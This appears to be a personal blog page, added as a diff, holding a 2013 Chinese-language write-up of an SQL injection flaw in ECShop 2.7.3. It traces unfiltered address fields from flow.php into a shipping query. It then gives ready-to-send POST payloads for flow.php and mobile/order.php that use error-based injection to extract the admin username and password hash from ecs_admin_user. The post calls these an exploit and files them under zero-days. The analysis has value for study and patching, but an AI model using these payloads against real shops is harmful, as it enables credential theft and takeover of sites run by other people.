@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ecshop注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp; &amp;nbsp; 前段时间大概2012年圣诞节左右，在t00ls上看见ecshop全版本注入，当时也下载了最新的程序分析了下,最近考试比较忙，今天刚考完，把我分析的记录下来。 &amp;nbsp; &amp;nbsp; 漏洞关键文件： &amp;nbsp; &amp;nbsp; /includes/lib_order.php &amp;nbsp; &amp;nbsp; 关键函数：     function available_ship">
+<meta name="keywords" content="ecshop注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ecshop全版本注入分析">
+<meta property="og:url" content="http://yoursite.com/2013/01/10/ecshop全版本注入分析/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp; &amp;nbsp; 前段时间大概2012年圣诞节左右，在t00ls上看见ecshop全版本注入，当时也下载了最新的程序分析了下,最近考试比较忙，今天刚考完，把我分析的记录下来。 &amp;nbsp; &amp;nbsp; 漏洞关键文件： &amp;nbsp; &amp;nbsp; /includes/lib_order.php &amp;nbsp; &amp;nbsp; 关键函数：     function available_ship">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ecshop全版本注入分析">
+<meta name="twitter:description" content="&amp;nbsp; &amp;nbsp; 前段时间大概2012年圣诞节左右，在t00ls上看见ecshop全版本注入，当时也下载了最新的程序分析了下,最近考试比较忙，今天刚考完，把我分析的记录下来。 &amp;nbsp; &amp;nbsp; 漏洞关键文件： &amp;nbsp; &amp;nbsp; /includes/lib_order.php &amp;nbsp; &amp;nbsp; 关键函数：     function available_ship">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2013/01/10/ecshop全版本注入分析/"/>
+
+
+
+
+
+  <title>ecshop全版本注入分析 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/01/10/ecshop全版本注入分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ecshop全版本注入分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-01-10T12:09:46+08:00">
+                2013-01-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">0day漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp; &nbsp; 前段时间大概2012年圣诞节左右，在t00ls上看见ecshop全版本注入，当时也下载了最新的程序分析了下,最近考试比较忙，今天刚考完，把我分析的记录下来。</p>
+<p>&nbsp; &nbsp; 漏洞关键文件：</p>
+<p>&nbsp; &nbsp; /includes/lib_order.php</p>
+<p>&nbsp; &nbsp; 关键函数：</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">    function available_shipping_list($region_id_list)
+{
+    $sql = ’SELECT s.shipping_id, s.shipping_code, s.shipping_name, ’ .
+                ’s.shipping_desc, s.insure, s.support_cod, a.configure ’ .
+            ’FROM ’ . $GLOBALS[’ecs’]-&gt;table(’shipping’) . ’ AS s, ’ .
+                $GLOBALS[’ecs’]-&gt;table(’shipping_area’) . ’ AS a, ’ .
+                $GLOBALS[’ecs’]-&gt;table(’area_region’) . ’ AS r ’ .
+            ’WHERE r.region_id ’ . db_create_in($region_id_list) .
+            ’ AND r.shipping_area_id = a.shipping_area_id AND a.shipping_id = s.shipping_id AND s.enabled = 1 ORDER BY s.shipping_order’;
+
+    return $GLOBALS[’db’]-&gt;getAll($sql);
+}</pre>
+<div>
+
+</div>
+<div>显然对传入的参数没有任何过滤就带入了查询语句。</div>
+<div>
+
+</div>
+<div>下面我们追踪这个函数在flow.php中：</div>
+
+&nbsp;第531行： &nbsp;&nbsp;
+
+<pre class="brush:php; toolbar: true; auto-links: true;">$shipping_list     = available_shipping_list($region);</pre>
+
+<p>&nbsp;</p>
+<p>再对传入变量进行追踪：</p>
+<p>第530行： &nbsp; &nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">$region = array($consignee[’country’], $consignee[’province’], $consignee[’city’], $consignee[’district’]);</pre>
+
+<p><span style="line-height:1.5;">&nbsp;</span></p>
+<p><span style="line-height:1.5;">第473行： &nbsp; &nbsp;</span>&nbsp; &nbsp;&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">$consignee = get_consignee($_SESSION[’user_id’]);</pre>
+
+<p><span style="line-height:1.5;"></span></p>
+<p></p>
+<p><span style="line-height:1.5;">到了一个关键函数：</span></p>
+<p><span style="line-height:1.5;">/includes/lib_order.php</span></p>
+<p><span style="line-height:1.5;"></span></p>
+<p></p>
+<pre class="brush:php; toolbar: true; auto-links: true;">function get_consignee($user_id)
+{
+    if (isset($_SESSION[’flow_consignee’]))
+    {
+        /&#42 如果存在session，则直接返回session中的收货人信息 &#42/
+
+        return $_SESSION[’flow_consignee’];
+    }
+    else
+    {
+        /&#42 如果不存在，则取得用户的默认收货人信息 &#42/
+        $arr = array();
+
+        if ($user_id &gt; 0)
+        {
+            /&#42 取默认地址 &#42/
+            $sql = "SELECT ua.&#42".
+                    " FROM " . $GLOBALS[’ecs’]-&gt;table(’user_address’) . "AS ua, ".$GLOBALS[’ecs’]-&gt;table(’users’).’ AS u ’.
+                    " WHERE u.user_id=’$user_id’ AND ua.address_id = u.address_id";
+
+            $arr = $GLOBALS[’db’]-&gt;getRow($sql);
+        }
+
+        return $arr;
+    }
+}</pre>
+
+<p><span style="line-height:1.5;"></span></p>
+<p></p>
+<p><span style="line-height:1.5;">显然如果&nbsp;</span><span style="line-height:1.5;">isset($_SESSION[’flow_consignee’]存在就直接使用。到底存不存在呢？</span></p>
+<p><span style="line-height:1.5;"></span></p>
+<p></p>
+<p><span style="line-height:1.5;">关键点:</span></p>
+<p>第400行： &nbsp; &nbsp;$_SESSION[’flow_consignee’] = stripslashes_deep($consignee);</p>
+<p>这里对传入参数反转义存入$_SESSION中。</p>
+<p>&nbsp;</p>
+<p>然后看下：</p>
+<p>&nbsp; &nbsp;&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">    $consignee = array(
+            ’address_id’    =&gt; empty($_POST[’address_id’]) ? 0  : intval($_POST[’address_id’]),
+            ’consignee’     =&gt; empty($_POST[’consignee’])  ? ’’ : trim($_POST[’consignee’]),
+            ’country’       =&gt; empty($_POST[’country’])    ? ’’ : $_POST[’country’],
+            ’province’      =&gt; empty($_POST[’province’])   ? ’’ : $_POST[’province’],
+            ’city’          =&gt; empty($_POST[’city’])       ? ’’ : $_POST[’city’],
+            ’district’      =&gt; empty($_POST[’district’])   ? ’’ : $_POST[’district’],
+            ’email’         =&gt; empty($_POST[’email’])      ? ’’ : $_POST[’email’],
+            ’address’       =&gt; empty($_POST[’address’])    ? ’’ : $_POST[’address’],
+            ’zipcode’       =&gt; empty($_POST[’zipcode’])    ? ’’ : make_semiangle(trim($_POST[’zipcode’])),
+            ’tel’           =&gt; empty($_POST[’tel’])        ? ’’ : make_semiangle(trim($_POST[’tel’])),
+            ’mobile’        =&gt; empty($_POST[’mobile’])     ? ’’ : make_semiangle(trim($_POST[’mobile’])),
+            ’sign_building’ =&gt; empty($_POST[’sign_building’]) ? ’’ : $_POST[’sign_building’],
+            ’best_time’     =&gt; empty($_POST[’best_time’])  ? ’’ : $_POST[’best_time’],
+        );</pre>
+
+<p>&nbsp;</p>
+<p>好了注入就这样出现了。</p>
+<p>==================</p>
+<p>注入测试：</p>
+<p>环境:windows7+xampp1.7.7(Apache2.2.21+Php 5.3.8+Mysql 5.5.16)</p>
+<p>测试程序：ECShop_V2.7.3_UTF8_release1106</p>
+<p>&nbsp;</p>
+<p>1.首先需要点击一个商品加入购物车</p>
+<p>2.注册一个会员帐号</p>
+<p>3.post提交数据</p>
+<pre class="brush:sql; toolbar: true; auto-links: true;">http://127.0.0.1/ecshop/flow.php
+
+country=1&amp;province=3’) and (select 1 from(select count(&#42),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)&#422))x from information_schema.tables group by x)a) and 1=1 #&amp;city=37&amp;district=409&amp;consignee=11111&amp;email=11111111%40qq.com&amp;address=1111111111&amp;zipcode=11111111&amp;tel=1111111111111111111&amp;mobile=11111111&amp;sign_building=111111111&amp;best_time=111111111&amp;Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&amp;step=consignee&amp;act=checkout&amp;address_id=</pre>
+
+<p>=======================================</p>
+<p>举一反三，我们根据这个漏洞我们可以继续深入挖掘：</p>
+<p>我们搜寻关键函数function&nbsp;<span style="line-height:1.5;">available_shipping_list()</span></p>
+<p>在文件/moblie/order.php中出现有，次文件为手机浏览文件功能基本和flow.php相同，代码流程基本相同</p>
+<p>利用exp:</p>
+<p>1.点击一个商品，点击购买商标</p>
+<p>2.登录会员帐号</p>
+<p>3.post提交：</p>
+<p><a href="http://127.0.0.1/ecshop/mobile/order.php" target="_blank" rel="noopener">http://127.0.0.1/ecshop/mobile/order.php</a></p>
+<p>&nbsp;</p>
+<p>country=1&amp;province=3’) and (select 1 from(select count(&amp;#42),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a) and 1=1 #&amp;city=37&amp;district=409&amp;consignee=11111&amp;email=11111111%40qq.com&amp;address=1111111111&amp;zipcode=11111111&amp;tel=1111111111111111111&amp;mobile=11111111&amp;sign_building=111111111&amp;best_time=111111111&amp;Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&amp;&amp;act=order_lise&amp;address_id=</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ecshop注入/" rel="tag"># ecshop注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/01/02/就这么到了2013/" rel="next" title="就这么到了2013">
+                <i class="fa fa-chevron-left"></i> 就这么到了2013
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/02/06/phpcms最近的那些注入/" rel="prev" title="phpcms最近的那些注入">
+                phpcms最近的那些注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
